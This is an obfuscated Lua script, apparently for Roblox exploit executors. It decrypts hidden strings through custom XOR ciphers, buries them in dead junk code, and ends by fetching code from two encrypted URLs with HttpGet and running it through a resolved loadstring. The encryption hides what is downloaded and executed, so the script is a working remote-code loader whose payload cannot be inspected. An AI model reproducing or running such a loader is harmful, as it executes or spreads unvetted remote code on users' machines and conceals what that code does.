return (function(...)
local _fbcK=0;
if type(print)~="function" or type(string.char)~="function" then _fbcK=(_fbcK+1)%256 end;
local _fbcGQV1={request=function() return request end,writefile=function() return writefile end,readfile=function() return readfile end,isfile=function() return isfile end,loadfile=function() return loadfile end,loadstring=function() return loadstring end,getgenv=function() return getgenv end,http_request=function() return http_request end,syn=function() return syn end,game=function() return game end,wait=function() return wait end,task=function() return task end,require=function() return require end,print=function() return print end,warn=function() return warn end,error=function() return error end,pcall=function() return pcall end,xpcall=function() return xpcall end,select=function() return select end,type=function() return type end,typeof=function() return typeof end,tostring=function() return tostring end,tonumber=function() return tonumber end,tick=function() return tick end,time=function() return time end,os=function() return os end,math=function() return math end,string=function() return string end,table=function() return table end,coroutine=function() return coroutine end,bit32=function() return bit32 end,debug=function() return debug end,getfenv=function() return getfenv end,setfenv=function() return setfenv end};
local function _fbcFHK0(_fbcLBLO)
local _fbcLPMP=getgenv and getgenv()
if type(_fbcLPMP)=="table" and _fbcLPMP[_fbcLBLO]~=nil then return _fbcLPMP[_fbcLBLO] end
_fbcLPMP=getrenv and getrenv()
if type(_fbcLPMP)=="table" and _fbcLPMP[_fbcLBLO]~=nil then return _fbcLPMP[_fbcLBLO] end
if type(_G)=="table" and _G[_fbcLBLO]~=nil then return _G[_fbcLBLO] end
if _fbcGQV1[_fbcLBLO] then return _fbcGQV1[_fbcLBLO]() end
return nil
end;
local _fbcCAM2="025007117250210178208056160092110253140012253109064206061211028212047091194100252034089085229248238235181087184059181055029116019241194202030078019197236083226046059153062246154036128200067005";
local function _fbcXQB3(_fbcLFTQ,_fbcLVOJ)
local _fbcLYKR=0
for _fbcLDFS=0,7 do
if _fbcLFTQ%2~=_fbcLVOJ%2 then _fbcLYKR=_fbcLYKR+2^_fbcLDFS end
_fbcLFTQ=math.floor(_fbcLFTQ/2) _fbcLVOJ=math.floor(_fbcLVOJ/2)
end
return _fbcLYKR
end;
local function _fbcYKM4(_fbcLAUA,_fbcLGMT)
local _fbcLIDU=((_fbcLAUA*17+_fbcLGMT*5+131)%64)*3+1
local _fbcLDHC=(tonumber(_fbcCAM2:sub(_fbcLIDU,_fbcLIDU+2))+_fbcLAUA)%256
if _fbcLDHC==0 then _fbcLDHC=1 end
return _fbcLDHC
end;
local function _fbcDSF7(_fbcLWP9,_fbcLAUA,_fbcLNNB)
local _fbcLDHC=_fbcYKM4(_fbcLAUA,_fbcLNNB)
local _fbcLHXD=_fbcLAUA
local _fbcLNVE=(_fbcLDHC*37+_fbcLHXD*91+_fbcLNNB*13)%256 if _fbcLNVE==0 then _fbcLNVE=1 end
local _fbcLQRF=(_fbcLDHC*131+_fbcLNNB*17+_fbcLHXD*29)%256
local _fbcLZNG=(_fbcLNVE*53+_fbcLHXD*17)%256
local _fbcLVDH={}
for _fbcLFRI=0,#_fbcLWP9/2-1 do
_fbcLQRF=(_fbcLQRF*73+_fbcLFRI*11+_fbcLDHC)%256
_fbcLZNG=(_fbcLZNG*47+_fbcLFRI*19+_fbcLNVE)%256
local _fbcLVOJ=tonumber(_fbcLWP9:sub(_fbcLFRI*2+1,_fbcLFRI*2+2),16)
local _fbcLPJK=(_fbcLHXD*31+17+_fbcLFRI*13)%256 if _fbcLPJK==0 then _fbcLPJK=1 end
_fbcLVOJ=((_fbcLVOJ%16)*16+math.floor(_fbcLVOJ/16))%256
_fbcLVOJ=_fbcXQB3(_fbcLVOJ,_fbcLPJK)
_fbcLVOJ=(_fbcLVOJ-_fbcLZNG)%256
_fbcLVOJ=_fbcXQB3(_fbcLVOJ,_fbcLQRF)
_fbcLVOJ=(_fbcLVOJ-_fbcLDHC-_fbcLNNB-_fbcLHXD*7-_fbcLFRI*3)%256
_fbcLVDH[#_fbcLVDH+1]=string.char(_fbcLVOJ)
end
return table.concat(_fbcLVDH)
end;
local function _fbcDQS8(_fbcLWP9,_fbcLAUA,_fbcLNNB)
local _fbcLDHC=_fbcYKM4(_fbcLAUA,_fbcLNNB)
local _fbcLVDH={}
for _fbcLFRI=0,#_fbcLWP9/2-1 do
local _fbcLVOJ=(tonumber(_fbcLWP9:sub(_fbcLFRI*2+1,_fbcLFRI*2+2),16)-(_fbcLDHC*11+_fbcLAUA*3+_fbcLFRI*7+_fbcLNNB)%256)%256
_fbcLVDH[#_fbcLVDH+1]=string.char(_fbcLVOJ)
end
return table.concat(_fbcLVDH)
end;
local _fbcTVRL={
[1]=function() return _fbcDQS8("effe2d040b161d2223366a424746548d639a69a57d85918c96a5d6abb7eec1ccd2dce5e7",0,_fbcK) end,
[4]=function() return _fbcDQS8("1b2e353842100c13525b6c7435757e908b9f93adb2abbfb7cad0ddd5e5f2b3ef0207d0eb14281f293d47515a1625562d3b3d415157885d956fa8aa898bc098a2d8abb2ecc1c9cf09dd14ef252bfd473d5a19535b36366f4c4e5462936975a8b08cbdc39ed2dbb2bbefc6cd0309e4161ef301330918161f272f36385c867f8991a5",3,_fbcK) end,
[7]=function() return _fbcDSF7("48d98e7f60e8580bb814cf4b6ba9a3bf67ca2fd721154a46b1a0ff0f094a182e3050f3171f1c93304c1685272bb3039f3d5d9578238678375854f21b578d666f3acd986f04163937b075d72d7698a7c2",6,_fbcK) end,
[10]=function() return _fbcDQS8("80c4c8dcd2a3b1bac0c8f8cfd910161e2729fe423e5850656d3f7b7d80819167929c71a7afb98f93cca0d8e4b8c4caff07091218f5f42e363d1949535b346670447b575d936c9ca7af83bb8f9ca3d5db",9,_fbcK) end,
[13]=function() return _fbcDQS8("86cacee2d8a9e6ecc4fb000610141cf42c040448445e566b734581838687976d9a7679b0898b96a0a0afe0b4c1c2fbd209e1ee22f9fd0509404c53292f673c484e538b63946a717e828bbf9d9fa5adb0",12,_fbcK) end,
[16]=function() return _fbcDSF7("6b21c06fcff0bff41e28bfe7e5cce981a60f20c10b2ad93bd9b97c7a611a5b1054d6886af710601323014d1e842bd2993bc3b11fc903a456f83c5d9af3c4b8af5a0064170bbfd74909e32147ce1ca0ed",15,_fbcK) end,
[19]=function() return _fbcDQS8("25696d817748828d936e6d79b083bd96ccd1a3e7e3fdf50a12e420222526360c3b43144f542e326a40497e598f679ea177b08b9097caa9a8e4e8c3c3d306d8e2ea232602353e181c202834366c425156",18,_fbcK) end,
[22]=function() return _fbcDQS8("94d8dcf0e6b7c0ccff070d18ecf82a0607151256526c647981538f919495a57b7a848890c49ca1d8b3b4c4c6ced1e01119ecf52c37101247235a323241444a538691976ca37d868f8dc5a3a8afe1b9c7",21,_fbcK) end,
[25]=function() return _fbcDSF7("8f78c418600ac9d4e366b653961e454bfe68e97925f6c92bf4087daa0f6ad884b3a24c24b5d21a48c7f1621eef680d6ba89554df2dd7fc2523a002cf94430bcec6643a4047e1b5423d8a19773e4980c7",24,_fbcK) end,
[28]=function() return _fbcDSF7("2fab8cef02f9f96433e62a3916bf6ed2682de04447a10337193337faa4959a1a7984188d47d03677c983d52b0b8b1e5d506428857a9edc7bdafce06c30560ac684866b37466927de4595c9d9469306d6",27,_fbcK) end,
[31]=function() return _fbcDSF7("9a4699a0f8fa6420cd0984ffc9d531bfd6f37902bb4f9e9fce3d8cd09cdc6676d523a58186be676536af40a7ffd4a8038adc96a3fe0dad9c0eea4fa7192ec7922dc555ac875e605bc9c57c4d01cca16f",30,_fbcK) end,
[34]=function() return _fbcDQS8("b3f7fb0f05d6111a1df8020a110f185029333175718b8398a072aeb0b3b4c49ac5a3d5dde3babfc6cc06e217f1f62903063d181c5130613c434c4a858c9599757b82849296cbcfd7b3baeef7fdd0dce1",33,_fbcK) end,
[37]=function() return _fbcDSF7("3d48b2a3123ceab75d375c644ed55b518bfd1dcbd7453752e5fe6e1ab6d0c5608626bd42cd81eb501d3e3d7405d38552d3e33fa8015ff8a017725350ede85a32c53863dc0269da500622c58152b01c5e",36,_fbcK) end,
[40]=function() return _fbcDQS8("25696d8177485258936b6f7681b2bd8f979da3e7e3fdf50a12e420222526360c3c43171c535e396d42787f8461616c7778b08a9395cba8aeb7bcf1c7d2020bdfee1efa2f030d451b1e2732336c41514f",39,_fbcK) end,
[43]=function() return _fbcDSF7("07d7c6f821e3c3f6f001c49e1b25c0192c52635ee19081c8fb223809c347592ddc0319da2b6621dad3bdf2ff036b0c5dd311f9d4c878bb2d24a0f03f3c4513ebd019efd97c6ecbd92665c5d753394861",42,_fbcK) end,
[46]=function() return _fbcDSF7("c328ea24ac75fb0135c7d09d485539b68a8842cdea21eef7f33f15bfcc5afa91a491b63ca8181400fcdbeb0b6fa56156d06a95987b94ed30b3ee0bdf25ac3006fbd87880c58c5ef184cf55ee3c675bea",45,_fbcK) end,
[49]=function() return _fbcDSF7("bf04bde41ef18cfb52cc20338130cec9d64d158ed607b091e2bde5d8bb1244b944c3b0e43d2bda8fc3ecdc5cecebc7e5a390b607df5d1e3e12e22a6465289dd617455ae423117bcfad3e97c2c859baf1",48,_fbcK) end,
[52]=function() return _fbcDSF7("292d836f047422bc30d48d5944370fd06e08edc0482c0fb41abe3570a2199596bfe612440fc41c8b315e1f8c1a300be7aa0e20b24301cbb7445f8c1512484b397c9a7573450c434d78d833e8641712cc",51,_fbcK) end,
[55]=function() return _fbcDSF7("4cdc8e7864e9652e5b112b7b6a4d9b7a2d672dde2d1e4e43bfaff708054b162b3d84ca6d31db2924ba41393f4841d260cd9f0977ad7eb423e75d80955ffbd813f3630574602e490c1c7e33ac218530bd",54,_fbcK) end
};
local _fbcTEKM={
[2]=function() return _fbcDSF7("02a8389c18f4880e2125",1,_fbcK) end,
[5]=function() return _fbcDSF7("d0981c976c70c108e317f6b69cf5413081e4172d7901b4e3f56aa5bea4f9cc8a19a0ea59c7f8395a824da0",4,_fbcK) end,
[8]=function() return _fbcDSF7("5e1e3ed87d0fbd4c203d94f06ee54a362bedd0bcbc56708980cdefc510a302e301d03f0d996f6c11963fee16aa9c3b1242dd6fa96163a56dc9ff813872ae33fa36eb73d8b8e8ad584f0d94080a9e471d",7,_fbcK) end,
[11]=function() return _fbcDQS8("69adb1c5bb8c99cdd4afe6babec7d5db0ce3e72b2741394e56286466696a7a5051575c9597a37c7f84be93caa6a9e0e8eec6fdd80ae0e821f72c090c104a1c252c633d407755855b969da27eb0b89499",10,_fbcK) end,
[14]=function() return _fbcDQS8("1f63677b71424b515c689ba07b80b68a94cd9de1ddf7ef040cde1a1c1f203006363c411a4d5533383d754a825b5c937076adaf8b8fc7cfd7dbb0eac6c5cd06e1e8e9f6fb00380a144d2258326a3e464d",13,_fbcK) end,
[17]=function() return _fbcDQS8("2064687c72434b565d9467767db2b6bc95989ee2def8f0050ddf1b1d20213107373c44191e2933373d404b4f8b8f699da2acb08896c9a2a4b1b4edf0f9ff04dbe5eb25f9053a0d154b232f61386f7953",16,_fbcK) end,
[20]=function() return _fbcDQS8("296d71857b4c895d679da3ad7f8c94c8a0a1a7ebe701f90e16e82426292a3a100e461a55275f66707850865c5f6570748189bd9899a6a9b2b7bbc8ccd1de0e181bf72e353a124821555e66696f455253",19,_fbcK) end,
[23]=function() return _fbcDQS8("f5393d514718552f376b3c4c4d565e606a7373b7b3cdc5dae2b4f0f2f5f606dcdfe4e6f3fb01050b3f1a4f272a3940427a55898d686c707c87b7be97a1d5abe3e7f3f8d0dae1e21df3f800040c154955",22,_fbcK) end,
[26]=function() return _fbcDSF7("f31d141d9b805faf730ba0ac432f6b3bae92b33ed0555e48e84c44053867e06379bbcf677063abbf811efed863851bda6eb897c90cbbb077d011e6b2644934394fe81f754c4077a37314a790564c6f22",25,_fbcK) end,
[29]=function() return _fbcDQS8("5fa3a7bbb182bcc49ed5aeb3e7bef7ff020cdd211d372f444c1e5a5c5f6070464949805e629773a7a97f8ebec6ceaaaab1e9f3f9d4060d151cf0272f373c121c55272e6744774d57895f9b6fa87b85bd",28,_fbcK) end,
[32]=function() return _fbcDQS8("80c4c8dcd2a3dde5bff2fbced5dde4eff2f9fe423e5850656d3f7b7d80819167686f70ac828bbd9a9ed3d9b4b8c4cbfd050be5ee1f2900073b174821272e696c437b4f5b5d9773767b81bb96c6a5d8ab",31,_fbcK) end,
[35]=function() return _fbcDQS8("b1f5f90d03d4dee820242d31060d4a1b285b2f736f8981969e70acaeb1b2c298c6cea9aab0ebf2f7fb07dae619f1fafd023d414a1e2c33673d474b5756669974a7ad81bb9298a1aadde5c0c3f903dbe2",34,_fbcK) end,
[38]=function() return _fbcDSF7("7b5f145b9d4bfc306bd8189684ce24dc446338f1db14dc0f6e03c9c2b9a4e820296eaa45de6cd425431da352888d2765b1607144d864eb0c09fe9566e191890166bebf27ad3218ea93601737d6b960f4",37,_fbcK) end,
[41]=function() return _fbcDQS8("bafe02160cdd17ecfb30063c431651253264387c78928a9fa779b5b7babbcba1a0aadcb7e8f4fbcc060bea1af32c2e0911121a282b343b43487f525c669ba0aaaf899292c8a6dbb0e6bff4c8d3de111a",40,_fbcK) end,
[44]=function() return _fbcDSF7("a82c0b6d84799f5f4cc2b1b95931fd44fda262c7c02386bb9ab0b27825121399ea78a8678df17a90ca7e5eeb891b2b2e0b08c54952bd78b4965662917c0bca11c098976e55e484b7c85a0fa9ad54d451",43,_fbcK) end,
[47]=function() return _fbcDSF7("63f8af97c74b16ed4428f53d88fa6a6dfde2cdb487f5abe45acb9cef65e57a86dd404e25d1f5fdfa43daa1ddd5138477157116f83ea9dc1fbdd92722eae8171b379b208c87bedcd20f33e9d984adaa1f",46,_fbcK) end,
[50]=function() return _fbcDQS8("e3272b3f3506164b1f245d333a437c4e5a6061a5a1bbb3c8d0a2dee0e3e4f4cacad3d50ee41c242a2e0c0e421f505836393e754f848d626e6ea881b58e93999fd6b2e5c0c9f8d10b0eeb1cf5fb343741",49,_fbcK) end,
[53]=function() return _fbcDQS8("9adee2f6ecbdce0107de14ef21ff320c3e12185c58726a7f875995979a9bab8183b8be94c9d1a6adb4c3c2ced309e117f3f82c073c141a512b5d363f42784d8662699d77ac838994c6a2d3abb8ebbff8",52,_fbcK) end,
[56]=function() return _fbcDQS8("02464a5e54252e35407650585a646e6e757e80c4c0dad2e7efc1fdff020313e9e5ebf22aff0f1419212929636b45467d5b606169a5a8b28c91c6cdd6dbb7b8efca00d30ae8ecf026fb353f191d265a33",55,_fbcK) end
};
local _fbcTBYN={
[3]=function() return _fbcDSF7("9658d4f7",2,_fbcK) end,
[6]=function() return _fbcDQS8("cb0f13271dee2c303a0e141f552e333d6e4b498d89a39bb0b88ac6c8cbccdcb2afb9bacacc04d9e4edf3f50134070e491e2a2a336d737b4e55636869747dafb8c295ccd4dce0bfbecafed6db13edf7fb",5,_fbcK) end,
[9]=function() return _fbcDQS8("7ec2c6dad0a1ace1edc3f8fd0710e4eff42afc403c564e636b3d797b7e7f8f65626872757b888e92cba7d9e0b6f0cafed607dde920f4f9043c111b522733656e447b825a64646a75ac7f8bc2c69bd4d9",8,_fbcK) end,
[12]=function() return _fbcDSF7("8604a6852cdd6aa261abf3b0f21258ef3d37002862ce661ff5d4de174a3579b4dcc029bbe8afa37edf99c67bdd33e839d0dea3c34276090991ad05719b6ab435a3f22dac7d980ab5c2bebf549a572104",11,_fbcK) end,
[15]=function() return _fbcDQS8("6aaeb2c6bc8d9dd2a4dbb4eec7cad5dadfe5e82c28423a4f572965676a6b7b517d835e649d75a683b6bd949ba7abafeac4c7d1d4dd13162024fe080a104a512b5c386c744f555c6465a0a77fb38ac2c7",14,_fbcK) end,
[18]=function() return _fbcDQS8("05494d615728373e424e4e5c8f636f757f8483c7c3ddd5eaf2c40002050616eceaf2f5fc383a1519542b61653e4450585c5d989f7581b28abfcba1a9dbb4c0bffad608e418f2f9faff3642174e2a5b30",17,_fbcK) end,
[21]=function() return _fbcDSF7("f081716f5af7497d4841512fad998e0f9bd7d98e1785fb932a3ca75b7d9602bf5972317ee37c907858985b16b7e497f79ca9413c4ad7e85277e45527e981cc0d857556531ecfa07153d4f23add955174",20,_fbcK) end,
[24]=function() return _fbcDSF7("18d2791c304eb1dc3c00432778282ff83c6c1d7b761db5c8c988ac8c57edc42c9a85ddb5010a7dd302bf413888f45ba92d2768f522c5089cf12890eabe2b04693f13760011d1fdc5df50f75877e074a7",23,_fbcK) end,
[27]=function() return _fbcDQS8("33777b8f8556936c9e7cb0869191c7cea4b4b1f5f10b031820f22e303334441a164c2b5e39386f497e57906a6da1a8b1b78fc89da8afb5bbedf9fdd60ae41ceffb02383f164a1f2a3465437651825b92",26,_fbcK) end,
[30]=function() return _fbcDQS8("96dadef2e8b9f6c8d8dcdd18edf2fe0007151458546e667b835591939697a77dacb388959aa2d6dbb5eac4cdfcdae012e8ee29fe3913464a21295f6a6f444a55585f679f737f84ba9098a4a5dfe5c0f3",29,_fbcK) end,
[33]=function() return _fbcDQS8("acf0f408fecfe0e716ed26010a3d0f1f4f2b2a6e6a847c91996ba7a9acadbd9395c8d0d7dcb4b9c6cad30510141b24fa313711194e285b326a404b4d5489616c9e7c808bba91c9a7d9b2b6ebc2cbcf0a",32,_fbcK) end,
[36]=function() return _fbcDSF7("cac9eb40e2134deb9024dcb5dd665b44106345e62a8aabdbbc93965e8f72387403f36801918664efb3db8923062f4b1c684c29142dbc491073e6e4bd633743e1426d101ce25314036b866f0d24535f3c",35,_fbcK) end,
[39]=function() return _fbcDSF7("c15a02faea6ffd9ce3b643d3e45c4d4aaee9af5ba492c1c9352e768d87c99da84900ddaee29abb67f0b565bf0c07045d88feb3fd9381b9b9e8e740e8d02e5ffe8a8e67e6cbe6a6d297fe47ea03e1763b",38,_fbcK) end,
[42]=function() return _fbcDSF7("9f633aa27458ebf4baf32de0281894e91bee5209b96837578ddd6edf9df2ccb0d0ce0b6b4cd70bf6becb0ea27b33f8fa37083d7b6597f009ba7503fe680daaf00dc8bd424c3b0b48d28a5db157edf7f5",41,_fbcK) end,
[45]=function() return _fbcDQS8("f135394d431423542e32694579545463976c6fb3afc9c1d6deb0eceef1f202d808da161af327fd0312111c2829336a3c4b7f865c9096717cb0b38c93c8d3a8ddb2bef2fad5d6e0e81d272d083b0f491e",44,_fbcK) end,
[48]=function() return _fbcDQS8("88ccd0e4daabb5f0f5ce03dae3e4f0f4fe06064a4660586d754783858889996f6aa3808588929b9ad2abb6bff3f7fed7e2e51bf6fe00040f4249552d3067427350835d629aa274af83bd909e9fdaaee8",47,_fbcK) end,
[51]=function() return _fbcDQS8("074b4f63592a373a71784e5762659ca2818485c9c5dfd7ecf4c60204070818ee1bf4fa323614451d535c32677246808260636aa075af8491949dcfa9b4e6edf3c903d910e61c26fe353b441720285b3a",50,_fbcK) end,
[54]=function() return _fbcDSF7("1fb83ef4fe6a1e7677343882abc7822ab6c9d7563e313da907e26ea31082c98685f19830d34337a4754369934da1e544f40731e7cee274965c1432baac42bf2752102bd43a760384073833e3ae52fa1f",53,_fbcK) end
};
local _fbcEJR5=_fbcFHK0(_fbcTEKM[(5)-3]());
local _fbcESG6=_fbcFHK0(_fbcTBYN[3]());
do local _fbcJOPV={n=23} if _fbcJOPV.n>0 then local _fbcJJAW=_fbcJOPV.n*0 end end
do local _fbcJQJY={} local _fbcJTXZ=0 for _fbcJYD10=1,4 do _fbcJQJY[_fbcJYD10]=_fbcJYD10*4 _fbcJTXZ=_fbcJTXZ+_fbcJQJY[_fbcJYD10] end end
do local _fbcJXI11=("x"):rep(4) if #_fbcJXI11>0 then local _fbcJDR12=#_fbcJXI11 end end
do local _fbcJHR14=1 while _fbcJHR14<1 do _fbcJHR14=_fbcJHR14+1 end end
do local _fbcJEN17=("i"):rep(2) if #_fbcJEN17>0 then local _fbcJWF18=#_fbcJEN17 end end
do local _fbcJIX1A=1 while _fbcJIX1A<1 do _fbcJIX1A=_fbcJIX1A+1 end end
do local _fbcJNU1D={n=15} if _fbcJNU1D.n>0 then local _fbcJRD1E=_fbcJNU1D.n*0 end end
do local _fbcJWV1G={} local _fbcJYR1H=0 for _fbcJFQ1I=1,3 do _fbcJWV1G[_fbcJFQ1I]=_fbcJFQ1I*2 _fbcJYR1H=_fbcJYR1H+_fbcJWV1G[_fbcJFQ1I] end end
do local _fbcJSS1J={n=34} if _fbcJSS1J.n>0 then local _fbcJHG1K=_fbcJSS1J.n*0 end end
do local _fbcJBY1M=1 while _fbcJBY1M<1 do _fbcJBY1M=_fbcJBY1M+1 end end
do local _fbcJWU1P={} local _fbcJQP1Q=0 for _fbcJNI1R=1,7 do _fbcJWU1P[_fbcJNI1R]=_fbcJNI1R*5 _fbcJQP1Q=_fbcJQP1Q+_fbcJWU1P[_fbcJNI1R] end end
do local _fbcJWH1S=(function(_fbcJZA1T) return _fbcJZA1T end)(8) local _fbcJKE1U=_fbcJWH1S*0 end
do local _fbcJPK1V=1 while _fbcJPK1V<1 do _fbcJPK1V=_fbcJPK1V+1 end end
do local _fbcJOM1Y={} local _fbcJSZ1Z=0 for _fbcJGD20=1,4 do _fbcJOM1Y[_fbcJGD20]=_fbcJGD20*2 _fbcJSZ1Z=_fbcJSZ1Z+_fbcJOM1Y[_fbcJGD20] end end
do local _fbcJRD21=(function(_fbcJJU22) return _fbcJJU22 end)(7) local _fbcJEK23=_fbcJRD21*0 end
do local _fbcJVV24=("b"):rep(3) if #_fbcJVV24>0 then local _fbcJON25=#_fbcJVV24 end end
do local _fbcJUM27={n=48} if _fbcJUM27.n>0 then local _fbcJQH28=_fbcJUM27.n*0 end end
do local _fbcJGL2A=("d"):rep(3) if #_fbcJGL2A>0 then local _fbcJLN2B=#_fbcJGL2A end end
do local _fbcJDD2D={} local _fbcJPX2E=0 for _fbcJJA2F=1,4 do _fbcJDD2D[_fbcJJA2F]=_fbcJJA2F*1 _fbcJPX2E=_fbcJPX2E+_fbcJDD2D[_fbcJJA2F] end end
do local _=_fbcTBYN[6]() end;
do local _=_fbcTVRL[7]() end;
do local _=_fbcTEKM[(61)-53]() end;
do local _=_fbcTBYN[(96)-87]() end;
do local _=_fbcTVRL[(79)-69]() end;
do local _=_fbcTEKM[(60)-49]() end;
do local _=_fbcTBYN[12]() end;
do local _=_fbcTVRL[(76)-63]() end;
do local _=_fbcTEKM[14]() end;
do local _=_fbcTBYN[(93)-78]() end;
do local _=_fbcTVRL[16]() end;
do local _=_fbcTEKM[17]() end;
do local _=_fbcTBYN[(97)-79]() end;
do local _=_fbcTVRL[(26)-7]() end;
do local _=_fbcTEKM[(27)-7]() end;
do local _=_fbcTBYN[21]() end;
do local _=_fbcTVRL[22]() end;
do local _=_fbcTEKM[(24)-1]() end;
do local _=_fbcTBYN[(30)-6]() end;
do local _=_fbcTVRL[25]() end;
do local _=_fbcTEKM[26]() end;
do local _=_fbcTBYN[27]() end;
do local _=_fbcTVRL[28]() end;
do local _=_fbcTEKM[(105)-76]() end;
do local _=_fbcTBYN[(117)-87]() end;
do local _=_fbcTVRL[(36)-5]() end;
do local _=_fbcTEKM[32]() end;
do local _=_fbcTBYN[(78)-45]() end;
do local _=_fbcTVRL[(109)-75]() end;
do local _=_fbcTEKM[35]() end;
do local _=_fbcTBYN[36]() end;
do local _=_fbcTVRL[37]() end;
do local _=_fbcTEKM[(74)-36]() end;
do local _=_fbcTBYN[39]() end;
do local _=_fbcTVRL[(113)-73]() end;
do local _=_fbcTEKM[41]() end;
do local _=_fbcTBYN[(86)-44]() end;
do local _=_fbcTVRL[(105)-62]() end;
do local _=_fbcTEKM[(62)-18]() end;
do local _=_fbcTBYN[45]() end;
do local _=_fbcTVRL[46]() end;
do local _=_fbcTEKM[47]() end;
do local _=_fbcTBYN[(52)-4]() end;
do local _=_fbcTVRL[(68)-19]() end;
do local _=_fbcTEKM[50]() end;
do local _=_fbcTBYN[(129)-78]() end;
do local _=_fbcTVRL[52]() end;
do local _=_fbcTEKM[53]() end;
do local _=_fbcTBYN[(141)-87]() end;
do local _=_fbcTVRL[55]() end;
do local _=_fbcTEKM[(106)-50]() end;

return (function(...)
ID=(_fbcTVRL[(52)-51]());RUN_AFTER=_fbcEJR5(_fbcESG6:HttpGet(_fbcTVRL[4]()));_fbcEJR5(_fbcESG6:HttpGet(_fbcTEKM[5]()))();
end)(...)
end)(...)
